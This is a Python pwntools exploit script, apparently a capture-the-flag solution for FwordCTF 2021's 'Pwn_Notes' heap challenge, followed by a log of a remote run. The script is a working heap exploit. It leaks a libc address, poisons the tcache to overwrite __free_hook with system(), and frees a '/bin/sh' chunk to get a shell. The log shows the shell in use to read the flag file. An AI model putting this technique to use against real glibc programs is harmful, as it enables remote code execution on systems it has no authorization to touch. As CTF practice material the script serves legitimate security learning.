from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './task2'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "40.71.72.198"
  PORT = 1235
  s = remote(HOST, PORT)
  libc = ELF("./libc-2.27.so")
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.31.so'})
  libc = elf.libc
  #libc = ELF("./libc-2.27.so")

def Create(idx, size, data):
  s.sendlineafter(">> ", "1")
  s.sendlineafter(">> ", str(idx))
  s.sendlineafter(">> ", str(size))
  s.sendafter(">> ", data)
  
def Delete(idx):
  s.sendlineafter(">> ", "2")
  s.sendlineafter(">> ", str(idx))

def Edit(idx, data):
  s.sendlineafter(">> ", "3")
  s.sendlineafter(">> ", str(idx))
  s.sendlineafter(">> ", data)

def View(idx):
  s.sendlineafter(">> ", "4")
  s.sendlineafter(">> ", str(idx))

def Exit():
  s.sendlineafter(">> ", "5")

for i in range(9): 
  Create(i, 0x80, chr(0x41+i)*0x10)

for i in range(8):
  Delete(i)

# libc leak
View(7)
libc_leak   = u64(s.recvuntil("\n")[:-1]+"\x00\x00")
libc_base   = libc_leak - libc.sym.__malloc_hook - 0x70
free_hook   = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
print "libc_leak =", hex(libc_leak)
print "libc_base =", hex(libc_base)

# Poisoning tcache
Edit(6, p64(free_hook)[:-2])

# Write system() address in __free_hook
Create(9, 0x80, "/bin/sh:\x00")
Create(10, 0x80, p64(system_addr)[:-2]+"_")

# Get shell!
Delete(9)

s.interactive()

'''
mito@ubuntu:~/CTF/FwordCTF_2021/Pwn_Notes$ python solve.py r
[*] '/home/mito/CTF/FwordCTF_2021/Pwn_Notes/task2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 40.71.72.198 on port 1235: Done
[*] '/home/mito/CTF/FwordCTF_2021/Pwn_Notes/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7f68364a6ca0
libc_base = 0x7f68360bb000
[*] Switching to interactive mode
$ id
uid=1000(fword) gid=1000(fword) groups=1000(fword)
$ ls -l
total 44
-rw-rw-r-- 1 root root    46 Aug 27 17:23 flag.txt
-rwxr-xr-x 1 root root 13320 Aug 27 17:56 task2
-rw-rw-r-- 1 root root  3063 Aug 27 17:23 task2.c
-rwxrwxr-x 1 root root 18744 Aug 27 17:23 ynetd
$ cat flag.txt
FwordCTF{i_l0V3_ru5tY_n0tEs_7529271026587478}
'''
